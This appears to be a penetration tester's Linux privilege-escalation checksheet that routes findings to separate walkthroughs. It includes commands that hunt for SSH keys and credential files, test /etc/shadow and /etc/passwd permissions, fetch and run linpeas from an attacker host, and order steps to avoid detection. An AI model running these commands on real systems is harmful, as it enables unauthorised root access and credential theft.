
Routes user-level Linux foothold to PrivEsc walkthroughs. Pure router — exploitation content lives in `Linux PrivEsc Walkthroughs/`. Post-root activities (credential extraction, persistence, lateral movement) out of scope.

Ordering: stealth-then-yield, with crash-risk vectors deferred. Zero-IOC checks first; filesystem scans late; kernel exploits second-to-last (crash risk); linpeas last (max IOC). Operator may deviate in lab/CTF context.

---

## Step 0 — Trivial root attempt

`su -`

When prompted for password, hit Enter (blank).

- Prompt returns `#` → root achieved. Done.
- "Authentication failure" → proceed.

---

## Step 1 — Sudo and group privileges

### Sudo:

`sudo -l`

- sudo -l lists a binary for which a GTFOBins entry exists with a `Shell` function AND the Shell function has a populated `Sudo` tab → [[Sudo Shell Escape]]
- `env_keep` includes `LD_PRELOAD` OR `LD_LIBRARY_PATH` → [[Sudo Environment Variables]]
- Nothing usable → proceed

### Groups:

`id`

- `docker` in groups → [[Docker Group Escape]]
- `lxd` or `lxc` in groups → [[LXD Group Escape]]
- `disk` in groups → [[Disk Group Escape]]
- None → proceed

---

## Step 2 — Sensitive file permissions

### /etc/shadow & /etc/passwd:

`test -r /etc/shadow && echo "SHADOW READABLE" || echo "SHADOW NOT READABLE"`
`test -w /etc/passwd && echo "PASSWD WRITABLE" || echo "PASSWD NOT WRITABLE"`
`test -w /etc/shadow && echo "SHADOW WRITABLE" || echo "SHADOW NOT WRITABLE"` 

- `SHADOW READABLE` → [[Linux PrivEsc Walkthroughs/Readable Shadow|Readable /etc/shadow]]
- `PASSWD WRITABLE` → [[Linux PrivEsc Walkthroughs/Writable Passwd|Writable /etc/passwd]]
- `SHADOW WRITABLE` → [[Linux PrivEsc Walkthroughs/Writable Shadow|Writable /etc/shadow]]
- All three `NOT` → proceed
### Credentials in files (history, config, SSH keys):

`find / \( -name "id_rsa" -o -name "id_ed25519" -o -name "id_ecdsa" -o -name ".bash_history" -o -name ".mysql_history" \) -readable 2>/dev/null`

`find /etc /opt /var/www /home -type f \( -name "*.conf" -o -name "*.ini" -o -name "*.yml" -o -name "*.env" \) -readable 2>/dev/null | head -50`

- Readable private key belonging to another user → [[Credential File Hunt]]
- Readable history or config containing credentials → [[Credential File Hunt]]
- Nothing → proceed

---

## Step 3 — Cron jobs

On **attacker**:

`(echo "bash <<'EOF'"; cat ~/scripts/cron_enum.sh; echo "EOF") | xclip -selection clipboard`

(Wayland: substitute `wl-copy` for `xclip -selection clipboard`.)

Paste into target shell.

Route on output markers:

- `WRITABLE_SCRIPT[root]: <path>` → [[Cron File Permissions]], use `<path>` as `<script>`
- `RELATIVE_CMD[root]: <cmd>` AND `WRITABLE_PATH_DIR: <dir>` both present → [[Cron PATH]]
- `WILDCARD[root]: <dir>:<file>:<line>:<body>` → [[Cron Wildcards]]
- No markers → no cron PrivEsc route, proceed to Step 4

---

## Step 4 — Root-owned services

`ps -ef | awk '$1=="root"'`

- `mysqld` running as root → [[MySQL UDF]]
- `postgres` running as root → [[Postgres UDF]]
- Other root-owned service with known CVE → check `OS Exploit Index/Linux/` and searchsploit
- Nothing → proceed

---

## Step 5 — NFS & mounts

`cat /etc/exports 2>/dev/null; cat /etc/fstab; mount`

- `/etc/exports` shows an export with `no_root_squash` → [[NFS no_root_squash Escape]]
- Nothing → proceed

---

## Step 6 — PATH abuse

`echo $PATH; for d in $(echo $PATH | tr ':' ' '); do test -w "$d" && echo "WRITABLE: $d"; done`

- Any directory in `$PATH` writable by current user → [[PATH Hijack]]
- None writable → proceed

---

## Step 7 — Capabilities

`getcap -r / 2>/dev/null`

- `cap_setuid+ep` on standard binary (e.g. `/usr/bin/python3`, `/usr/bin/perl`) → [[Capability Abuse]]
- `cap_dac_read_search+ep` on accessible binary → [[Capability Abuse]]
- `cap_sys_admin+ep` on accessible binary → [[Capability Abuse]]
- Nothing → proceed

---

## Step 8 — SUID / SGID binaries

⚠️ High IOC. Full filesystem traversal — run once; the technique walkthroughs reuse this output, they do not re-run the `find`.

`find / -type f \( -perm -4000 -o -perm -2000 \) -exec ls -l {} + 2>/dev/null`

(No output → proceed to Step 9)

Try the below technique walkthroughs in stealth-first order. Each receives this list (the output from the above command), self-selects the binaries it applies to, loops them, and returns here on exhaustion to try the next:

1. [[SUID Known Exploits]]
2. [[SUID Shared Object Injection]]
3. [[SUID Environment Variables]]
4. [[SUID Function Export Hijack]]

All four exhausted with no elevation → proceed to Step 9.

---

## Step 9 — Kernel exploits

⚠️ Kernel exploits risk kernel panics — box may need reset. Run only after Steps 0–8 fall through.

`uname -a; cat /etc/os-release 2>/dev/null`

- Distribution + kernel match in `OS Exploit Index/Linux/` → run matched walkthrough
- No match → `searchsploit linux kernel <version>` for manual triage
- Patched / no exploit / unwilling to risk crash → proceed

---

## Step 10 — Automated enumeration (linpeas)

Maximum IOC. Comprehensive backstop.

### Transfer:

On attacker (in the linpeas directory):

`python3 -m http.server 8000`

On target:

`wget http://<lhost>:8000/linpeas.sh -O /tmp/linpeas.sh && chmod +x /tmp/linpeas.sh`

### Run:

`/tmp/linpeas.sh -a 2>&1 | tee /tmp/linpeas.out`

### Triage:

Focus on red+yellow flagged findings. Route each finding back to the appropriate step above (sudo / SUID / cron / etc.) for exploitation.

### Cleanup:

`rm /tmp/linpeas.sh /tmp/linpeas.out`

---

## Exhaustion

All ten steps fall through:

1. Re-review `linpeas.out` for less-common findings (kernel keyring, polkit, dbus, custom services).
2. Deeper enum on app-specific artefacts: `/var/spool/`, `/var/backups/`, `/opt/`, `/srv/`.
3. Reconsider scope — PrivEsc may require lateral movement first (login as another user via discovered SSH keys / passwords, then re-run this checksheet from that user's context).
